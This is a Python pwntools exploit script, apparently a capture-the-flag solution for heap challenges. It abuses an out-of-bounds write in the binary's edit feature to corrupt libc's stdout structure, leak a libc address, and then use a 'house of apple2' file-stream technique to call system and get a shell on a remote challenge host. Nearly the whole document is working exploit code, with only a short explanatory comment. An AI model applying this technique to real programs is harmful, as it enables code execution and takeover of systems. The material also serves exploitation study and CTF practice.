#!/usr/bin/env python3

from pwn import *
import io_file

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
global p, index

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''
dprintf *edit+0xe9,"reading into %p\\n",$rdi
continue
''')
            sleep(2)
    else:
        p = remote("172.31.3.2",4240)
    return p

def malloc(idx, size):
    p.sendlineafter(b"exit",b"1")
    p.sendlineafter(b"index >",str(idx).encode())
    p.sendlineafter(b"size >",str(size).encode())
    
def free(idx):
    p.sendlineafter(b"exit",b"2")
    p.sendlineafter(b"index >",str(idx).encode())

def edit(idx, data): # this func has overflow Lol
    p.sendlineafter(b"exit",b"3")
    p.sendlineafter(b"index >",str(idx).encode())
    # p.sendlineafter(b"size >",b"99999")
    p.sendafter(b"content > ",data)
    
def read(idx):
    p.sendlineafter(b"exit",b"3")
    p.sendlineafter(b"index > ",str(idx).encode())
    leak = p.readuntil(b"1. add note",drop=True)
    return leak


def main():
    global p
    p = conn()
    
    """
    babyheap & noview without doing any heap exploitation :troll:
    
    theory:
    for babyheap AND noview, there is no bounds check on the 'edit' feature
    this means if there are any pointers lying outside of the 'notes' array, we can write to them with the edit feature
    and right behind 'notes' are pointers to libc's stdin/stdout/stderr!
    these are well known to be VERY exploitable, and we can freely edit them. :)
    
    more at https://corgi.rip/posts/leakless_heap_1/, "Step 2: RCE" section
    """
    # context: stdout is at notes[-8]
    
    # step 0: create chunk at notes[24] so that sizes[-8] has valid size
    malloc(28,0x60)
    
    # step 1: hijack stdout to force libc leak
    edit(-8,( 
        p64(0xfbad3887) + # add _IO_IS_APPENDING flag to stdout
        p64(0)*3 + # read_base, end, and ptr. can be anything
        p8(0) # overwrite LSB of write_base
        ))
        
    libc_leak = u64(p.recvn(16)[8:])
    libc.address = libc_leak - libc.sym['_IO_2_1_stdin_']
    info(f"{libc.address:#x}")

    # step 2: fsop to shell
    file = io_file.IO_FILE_plus_struct() 
    payload = file.house_of_apple2_execmd_when_do_IO_operation(
        libc.sym['_IO_2_1_stdout_'],
        libc.sym['_IO_wfile_jumps'],
        libc.sym['system'])
    
    edit(-8,payload)

    p.interactive() # What is a heap exploitations? Someone help
    
if __name__ == "__main__":
    main()
